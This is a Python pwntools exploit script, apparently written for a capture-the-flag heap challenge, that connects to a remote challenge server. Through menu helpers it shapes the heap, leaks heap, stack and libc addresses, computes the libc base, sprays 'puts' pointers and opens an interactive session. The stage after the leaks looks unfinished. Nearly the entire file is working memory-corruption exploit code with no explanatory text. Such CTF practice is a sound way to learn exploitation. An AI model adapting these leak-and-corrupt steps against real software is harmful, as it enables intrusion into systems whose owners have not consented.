#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def fuzz(r):
    
    whole_data = b""
    random_data = b""
    while True:
        for i in range(0x10):
            random_data += str(random.randint(0, 3)).encode() + b" "
            whole_data += random_data

        
        r.sendline(random_data)
        random_data = b""
        
        print("WHOLE DATA:", whole_data)

def conn():
    r = process([exe.path])
    return r


#r = conn()
r = remote("mc.ax", 31707)

def create(index, name):
    r.recvuntil("choice: \n")
    r.sendline("0")
    r.recvline()
    r.sendline(str(index))
    r.recvline()
    r.sendline(name)

def fav(index):
    r.recvuntil("choice: \n")
    r.sendline("1 " + str(index))

def show():
    r.recvuntil("choice: \n")
    r.sendline("2")

def eat():
    r.recvuntil("choice: \n")
    r.sendline("3")

def main():

    create(1, b"1"*0x18)
    create(2, b"2"*0x18)
    create(3, b"3"*0x18)
    fav(1)
    create(1, b"1")

    fav(2)
    create(2, b"2")

    fav(3)
    create(3, b"3")
    
    create(0, b"M"*0xfff)
    fav(0)
    create(0, b"A"*0x18)
    
    show()
    
    ##
    """
    r.recvuntil("name: ")
    
    for i in range(0xff):
        print(hex(u64(r.recv(8))) + "\t" + hex(u64(r.recv(8))) )

    """
    

    ##

    r.recvuntil("name: ")

    #r.recv(0x48)
    r.recv(0x218)

    HEAP_LEAK = u64(r.recv(8))
    log.warn("HEAP LEAK @ 0x%x", HEAP_LEAK)
    #HEAP_BASE = HEAP_LEAK - 0x13400
    #HEAP_BASE = HEAP_LEAK - 0x13870
    HEAP_BASE = HEAP_LEAK - 0x13470
    log.warn("HEAP BASE @ 0x%x", HEAP_BASE)

    #libc_pointer_at = HEAP_BASE + 0x14c90
    #remotely
    #payload = p64(HEAP_BASE + 0x11e90)
    #locally
    payload = p64(HEAP_BASE + 0x11f08)
    payload += p64(HEAP_BASE)
    payload += p64(0x20000) + p16(0)

    create(4, payload)

    show()
    
    STACK_LEAK = u64(r.recvuntil(b"\x7f")[-6::] + p16(0))
    log.warn("STACK_LEAK leak @ 0x%x", STACK_LEAK)

    r.recvuntil(b"\x7f")

    LIBC_LEAK = u64(r.recvuntil(b"\x7f")[-6::] + p16(0))
    log.warn("LIBC LEAK @ 0x%x", LIBC_LEAK)
    LIBC_BASE = LIBC_LEAK - 0x1bbca0
    log.warn("LIBC_BASE @ 0x%x", LIBC_BASE)
    
    libc.address = LIBC_BASE
    
    create("5", p64(libc.sym['puts'])*(0xff0//8))

    
    show()

    r.recvuntil("name: ")
    data = r.recvuntil(p64(libc.sym['puts'])*0x10)
    r.recv()
    print("Length = ", hex(len(data)))
    



    r.interactive()


if __name__ == "__main__":
    main()
